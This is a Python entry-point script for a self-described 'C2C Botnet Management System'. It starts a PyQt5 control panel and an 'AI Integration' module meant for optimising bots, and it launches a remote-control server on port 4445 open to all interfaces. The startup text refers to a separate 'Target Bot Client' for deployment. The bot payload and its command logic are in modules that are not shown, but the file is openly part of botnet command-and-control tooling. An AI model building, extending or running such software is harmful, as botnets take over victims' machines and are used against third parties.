#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
C2C Botnet Management System - Main Entry Point
Integrated Application with AI and Remote Control
"""

import sys
import os
import threading
import time
import logging

# Set Qt attributes BEFORE creating QApplication
from PyQt5.QtCore import Qt
from PyQt5.QtWidgets import QApplication, QMessageBox

# Must set these attributes before QApplication is created
QApplication.setAttribute(Qt.AA_EnableHighDpiScaling, True)
QApplication.setAttribute(Qt.AA_UseHighDpiPixmaps, True)

# Thêm thư mục hiện tại vào Python path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from PyQt5.QtGui import QIcon

# Import GUI module
from gui import MainWindow

# Import AI and Remote Control từ modules đã tối ưu
try:
    from core.integration import get_ai_manager, initialize_ai_integration
    AI_AVAILABLE = True
    print("[OK] AI Integration module loaded successfully")
except ImportError as e:
    print(f"[WARNING] AI Integration not available: {e}")
    AI_AVAILABLE = False

try:
    from administration import RemoteController
    REMOTE_CONTROL_AVAILABLE = True
    print("[OK] Remote Control module loaded successfully")
except ImportError as e:
    print(f"[WARNING] Remote Control not available: {e}")
    REMOTE_CONTROL_AVAILABLE = False

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('c2c_main.log'),
        logging.StreamHandler()
    ]
)

class IntegratedC2CApplication:
    """Integrated C2C Application with GUI, AI, and Remote Control"""
    
    def __init__(self):
        self.logger = logging.getLogger('IntegratedC2C')
        
        # Core components
        self.gui_window = None
        self.ai_manager = None
        self.remote_controller = None
        
        # Status tracking
        self.components_status = {
            'gui': False,
            'ai': False,
            'remote_control': False
        }
        
    def initialize_ai_system(self):
        """Initialize AI Integration System"""
        if not AI_AVAILABLE:
            self.logger.warning("AI Integration not available")
            return False
            
        try:
            # Initialize AI with custom config
            ai_config = {
                'auto_learning': True,
                'insight_generation': True,
                'performance_tracking': True,
                'model_persistence': True,
                'update_interval': 30,
                'max_insights': 100,
                'confidence_threshold': 0.7
            }
            
            self.ai_manager = initialize_ai_integration(ai_config)
            self.components_status['ai'] = True
            
            self.logger.info("[AI] AI Integration System initialized successfully")
            return True
            
        except Exception as e:
            self.logger.error(f"[AI] Error initializing AI system: {e}")
            return False
            
    def initialize_remote_control(self):
        """Initialize Remote Control Server"""
        if not REMOTE_CONTROL_AVAILABLE:
            self.logger.warning("Remote Control not available")
            return False
            
        try:
            # Initialize remote controller on port 4445
            self.remote_controller = RemoteController(host='0.0.0.0', port=4445)
            
            # Start remote control server in background thread
            def start_remote_control():
                try:
                    if self.remote_controller.start():
                        self.components_status['remote_control'] = True
                        self.logger.info("[REMOTE] Remote Control Server started on port 4445")
                    else:
                        self.logger.error("[REMOTE] Failed to start Remote Control Server")
                except Exception as e:
                    self.logger.error(f"[REMOTE] Remote Control startup error: {e}")
                    
            # Start in background thread
            remote_thread = threading.Thread(target=start_remote_control, daemon=True)
            remote_thread.start()
            
            return True
            
        except Exception as e:
            self.logger.error(f"[REMOTE] Error initializing Remote Control: {e}")
            return False
            
    def initialize_gui(self, app):
        """Initialize GUI with integrated components"""
        try:
            # Create main window with integrated components
            self.gui_window = MainWindow()
            
            # Inject AI manager into GUI if available
            if self.ai_manager and hasattr(self.gui_window, 'set_ai_manager'):
                self.gui_window.set_ai_manager(self.ai_manager)
                self.logger.info("[GUI] AI Manager integrated into GUI")
                
            # Inject remote controller into GUI if available
            if self.remote_controller and hasattr(self.gui_window, 'set_remote_controller'):
                self.gui_window.set_remote_controller(self.remote_controller)
                self.logger.info("[GUI] Remote Controller integrated into GUI")
                
            self.components_status['gui'] = True
            self.logger.info("[GUI] GUI initialized successfully")
            return True
            
        except Exception as e:
            self.logger.error(f"[GUI] Error initializing GUI: {e}")
            return False
            
    def start_application(self, app):
        """Start the integrated application"""
        try:
            # Show startup status
            self.show_startup_status()
            
            # Show main window
            self.gui_window.show()
            
            # Show integration status in GUI
            self.update_gui_status()
            
            self.logger.info("[APP] C2C Integrated Application started successfully!")
            return True
            
        except Exception as e:
            self.logger.error(f"[APP] Error starting application: {e}")
            return False
            
    def show_startup_status(self):
        """Show startup status"""
        print("\n" + "="*60)
        print("[STARTUP] C2C Botnet Management System - Integrated Mode")
        print("="*60)
        
        # Component status
        print("\n[STATUS] Component Status:")
        print(f"   [GUI] GUI: {'[OK] Active' if self.components_status['gui'] else '[FAIL] Failed'}")
        print(f"   [AI] AI System: {'[OK] Active' if self.components_status['ai'] else '[SKIP] Not Available'}")
        print(f"   [REMOTE] Remote Control: {'[OK] Active' if self.components_status['remote_control'] else '[SKIP] Not Available'}")
        
        # Capabilities summary
        active_components = sum(self.components_status.values())
        print(f"\n[SUMMARY] Active Components: {active_components}/3")
        
        # Module locations
        print(f"\n[ARCHITECTURE] Optimized Module Structure:")
        print(f"   • main.py: Main application entry point")
        print(f"   • core/integration/ai_manager.py: AI Intelligence System")
        print(f"   • administration/remote_admin.py: Secure Remote Control")
        print(f"   • deployment/bot_client.py: Target Bot Client")
        
        if self.components_status['ai']:
            print("   • AI-powered bot optimization")
            print("   • Intelligent threat detection")
            print("   • Performance analytics")
            
        if self.components_status['remote_control']:
            print("   • Secure remote administration")
            print("   • HMAC authentication")
            print("   • Session management")
            
        print("\n" + "="*60)
        
    def update_gui_status(self):
        """Update GUI with integration status"""
        try:
            if not self.gui_window:
                return
                
            # Update status bar if available
            if hasattr(self.gui_window, 'update_integration_status'):
                status_info = {
                    'ai_active': self.components_status['ai'],
                    'remote_active': self.components_status['remote_control'],
                    'ai_manager': self.ai_manager,
                    'remote_controller': self.remote_controller
                }
                self.gui_window.update_integration_status(status_info)
                
        except Exception as e:
            self.logger.error(f"Error updating GUI status: {e}")
            
    def shutdown(self):
        """Shutdown all components gracefully"""
        self.logger.info("[SHUTDOWN] Shutting down C2C Application...")
        
        try:
            # Stop AI monitoring
            if self.ai_manager:
                self.ai_manager.stop_monitoring()
                self.logger.info("[AI] AI System stopped")
                
            # Stop remote control
            if self.remote_controller:
                self.remote_controller.stop()
                self.logger.info("[REMOTE] Remote Control stopped")
                
            self.logger.info("[SHUTDOWN] C2C Application shutdown complete")
            
        except Exception as e:
            self.logger.error(f"[SHUTDOWN] Error during shutdown: {e}")

def setup_application():
    """Thiết lập application"""
    app = QApplication(sys.argv)
    
    # Application properties
    app.setApplicationName("C2C Botnet Management System")
    app.setApplicationDisplayName("C2C Integrated Control Panel")
    app.setApplicationVersion("2.0.0")
    app.setOrganizationName("C2C Security Research")
    app.setOrganizationDomain("c2c.local")
    
    # Set application icon nếu có
    if os.path.exists("assets/icon.png"):
        app.setWindowIcon(QIcon("assets/icon.png"))
    
    return app

def main():
    """Main function with integrated components"""
    c2c_app = None
    
    try:
        # Create Qt application
        app = setup_application()
        
        print("[STARTUP] Starting C2C Botnet Management System - Integrated Mode")
        print("[INIT] Initializing components...")
        
        # Create integrated application
        c2c_app = IntegratedC2CApplication()
        
        # Initialize components
        print("\n[INIT] Initializing AI Integration...")
        c2c_app.initialize_ai_system()
        
        print("[INIT] Initializing Remote Control...")
        c2c_app.initialize_remote_control()
        
        print("[INIT] Initializing GUI...")
        if not c2c_app.initialize_gui(app):
            raise Exception("Failed to initialize GUI")
            
        # Small delay to let background services start
        time.sleep(1)
        
        # Start the application
        if not c2c_app.start_application(app):
            raise Exception("Failed to start application")
            
        # Handle application shutdown
        def cleanup_on_exit():
            if c2c_app:
                c2c_app.shutdown()
                
        app.aboutToQuit.connect(cleanup_on_exit)
        
        # Start event loop
        exit_code = app.exec_()
        
        # Final cleanup
        cleanup_on_exit()
        return exit_code
        
    except ImportError as e:
        print(f"[ERROR] Import Error: {e}")
        print("\n[INSTALL] Please install required dependencies:")
        print("   pip install PyQt5 PyQt5-tools")
        print("   pip install psutil scikit-learn numpy joblib")
        return 1
        
    except Exception as e:
        print(f"[ERROR] Application Error: {e}")
        import traceback
        traceback.print_exc()
        
        # Emergency cleanup
        if c2c_app:
            try:
                c2c_app.shutdown()
            except:
                pass
                
        return 1

if __name__ == "__main__":
    exit_code = main()
    sys.exit(exit_code)
